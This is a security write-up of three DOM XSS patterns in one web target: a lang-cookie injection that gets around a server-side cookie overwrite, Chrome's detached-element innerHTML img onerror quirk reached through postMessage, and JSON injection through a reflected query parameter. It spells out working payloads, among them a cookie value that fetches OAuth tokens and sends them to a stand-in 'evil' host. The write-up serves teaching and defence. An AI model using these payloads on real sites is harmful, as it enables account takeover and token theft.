Three DOM XSS Patterns: Cookie Overwrite Bypass, Chrome innerHTML Quirk, and JSON Injection

Based on elmahdi4's research · Three distinct DOM XSS vulnerabilities chained into full account takeover

Summary

A single target had three separate DOM XSS paths, each with different source/sink combinations. All reached full account takeover via OAuth token theft. This writeup walks through each pattern, the bypass techniques, and the final exploit chain.

Pattern 1: Cookie-Scoped DOM XSS + Server Overwrite Bypass

The Vulnerability

The app read the lang cookie via regex and injected it into an inline script string:

function i() {
  const t = document.cookie.match(new RegExp("(^| )lang=([^;]+)"));
  const i = t ? t[2] : "en";
  return { lang: i };
}

// Later...
const scriptCode = `var page = { config: { lang: "${p || i().lang}" } };`;
const s = document.createElement('script');
s.text = scriptCode;
document.head.appendChild(s);

An attacker setting lang="; alert(1); // as a cookie escapes the string literal, injects arbitrary JS, and comments out the rest. When the fresh script element is appended, the browser evaluates it.

The Server-Side Defense

The backend tried to patch this by overwriting the lang cookie on sensitive endpoints:

// On /login response:
Set-Cookie: lang=en; Path=/; Max-Age=86400

Any malicious cookie value got replaced with en before the vulnerable JS could read it. Clever defense — but incomplete.

The Bypass

The same vulnerable JS ran on /signup, /reset-password, /invite, and other flows. The developer only patched /login. Any unpatched endpoint still processed the attacker's cookie value.

Attack Chain

1. Attacker sets cookie: document.cookie = 'lang="; fetch("/oauth/token").then(r=>r.json()).then(t=>fetch("https://evil/?"+btoa(JSON.stringify(t)))); //; path=/'

2. Victim navigates to /signup (no Set-Cookie overwrite)

3. Vulnerable JS reads the attacker's cookie, interpolates it into the inline script

4. Script executes, steals OAuth tokens, exfiltrates to attacker server

5. Attacker uses stolen tokens for full account takeover

Lessons

  • Security must be applied at the source, not at the perimeter. Fixing the XSS sink would have killed all instances.
  • Server-side cookie overwriting is a brittle defense that breaks silently when new routes are added.
  • Always check every endpoint that processes the same shared client code.

Pattern 2: Chrome innerHTML Quirk via "Detached" Element

The Vulnerability

A postMessage handler processed message data as JSON. To support legacy clients that HTML-encoded their quotes, the handler did a "safe" HTML decode using a detached <p> element:

window.addEventListener('message', function(event) {
  let jsonStr = event.data;

  if (jsonStr.indexOf('&quot;') !== -1) {
    // "Safe" decode - detached element, never appended to DOM
    const p = document.createElement('p');
    p.innerHTML = jsonStr;  // The bug lives here
    jsonStr = p.innerText;
  }

  const payload = JSON.parse(jsonStr);
  // ... process payload
});

The developer assumed that because the <p> element never entered the DOM, innerHTML assignment couldn't trigger script execution. This is mostly true for <script> tags, but not for image-based event handlers.

The Chrome Quirk

Chrome (and WebKit) begin loading resources for <img> tags as soon as their src is parsed — even inside a detached element. When the resource fails to load (e.g. src=x), the onerror handler fires in the page's JS context.

// Run this in any Chrome console:
const p = document.createElement('p');
p.innerHTML = '<img src=x onerror="alert(\'detached!\')">';
// alert fires even though p is never appended!

The Exploit

// Attacker frames the target page, then sends:
targetFrame.contentWindow.postMessage(
  '&quot;<img src=x onerror=maliciousFunction()>',
  '*'
);

// The "&quot;" prefix triggers the vulnerable decoder path.
// innerHTML parses the img tag, Chrome loads src=x, fails, onerror fires.
// XSS in the context of the target page.

Why This Matters

Developers frequently use detached elements as "sanitizers" — DOMParser, temporary divs, document fragments. The Chrome quirk breaks this assumption for <img>, <iframe>, and other resource-loading tags. Any detached-element decoder that accepts attacker-controlled HTML is a potential XSS sink.

Pattern 3: JSON Injection via Querystring Reflection

The Vulnerability

A config endpoint reflected the v query parameter into the JSON response as a raw string, without escaping:

// Server-side (simplified):
app.get('/api/config', (req, res) => {
  const v = req.query.v || '1.0';
  const json = `{
  "version": "${v}",
  "features": { ... },
  "api": { ... }
}`;
  res.setHeader('Content-Type', 'application/json');
  res.send(json);
});

By sending crafted characters in v, an attacker could break out of the version string and inject new top-level keys into the JSON.

The Dangerous Client Pattern

The client then merged a specific config field into window:

fetch('/api/config?v=' + encodeURIComponent(ver))
  .then(r => r.json())
  .then(config => {
    if (config.window) {
      Object.assign(window, config.window);  // THE SINK
    }
  });

Assigning a string to window.location navigates the page. javascript: URIs execute code.

Crafting the Injection

The attacker needs to:

  1. Close the open version string with "
  2. Inject a new key: ,"window":{"location":"javascript:alert(1)"}
  3. Re-open a dummy key so the trailing " from the template lands in a valid position
// Attacker URL:
/api/config?v=1","window":{"location":"javascript:alert(1)"},"x":"

// Resulting JSON body:
{
  "version": "1","window":{"location":"javascript:alert(1)"},"x":"",
  "features": { ... },
  "api": { ... }
}

// Valid JSON. config.window.location = "javascript:alert(1)".
// Object.assign(window, config.window) triggers navigation → JS execution.

Bug Bounty Tip

When auditing JSON config endpoints, test with characters like ", }, ], and , in query parameters. If they come back unescaped, you likely have JSON injection. Then look at what the client does with the parsed config — anything that uses Object.assign, spreads, or blind property access can be chained to XSS, CSRF, or logic bugs.

Why These Patterns Recur

  1. Security retrofits are fragile. The cookie overwrite was a band-aid that only covered one endpoint. A proper fix (output encoding at the sink) would have been one line.
  2. "Detached" does not mean "inert". Browsers treat detached elements as live for certain operations. Don't assume a detached innerHTML is safe.
  3. String concatenation into structured formats is always a mistake. Whether it's SQL, HTML, or JSON, interpolating user input into a serialization format without proper encoding creates injection.
